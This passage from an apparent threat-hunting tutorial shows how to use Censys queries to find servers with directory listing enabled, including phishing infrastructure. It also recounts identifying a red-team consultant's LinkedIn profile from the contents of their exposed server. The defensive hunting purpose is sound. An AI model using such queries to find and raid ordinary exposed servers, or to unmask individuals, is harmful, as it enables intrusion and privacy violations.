This uncovers thousands of results, which appear to be tagged with the "open-dir" tag.

We can interact with one of them and verify that it does have a service that is vulnerable to directory listing.

### Refining Query
Let's refine the query to search for files that have the word "phishing" in them.

```
(services.http.response.html_title:"Index of /" or services.http.response.html_title:"Directory Listing for /") and services.http.response.body:"phishing"

```
Searching the results we find some phishing-related items on a server vulnerable to directory listing. Unsurprisingly, the server IP is already flagged by VirusTotal as phishing likely due to the server contents being easily analyzed by internet scanners.

## Example: Offensive Security Consultant
Unfortunately, being an offensive security consultant does not necessarily mean these individuals do not make mistakes. For example, while searching for directory listing vulnerabilities, we came across a server that is clearly associated with penetration testing/red teaming.

Through some further reconnaissance of the contents on the server, we were able to locate the user's LinkedIn profile with high confidence.

## Conclusão
Directory listing is an opsec failure that affects attackers along with professional offensive security consultants. It can destroy an entire campaign and allow defenders to download and signature tools and templates. It's possible to see the amount of malicious servers with directory listing discovered daily by searching `#opendir` on X.

## Objetivos
Use Shodan, Censys, Google Dorks or any other online service to find directory listing websites

Find a malicious website that accidentally left directory listing enabled
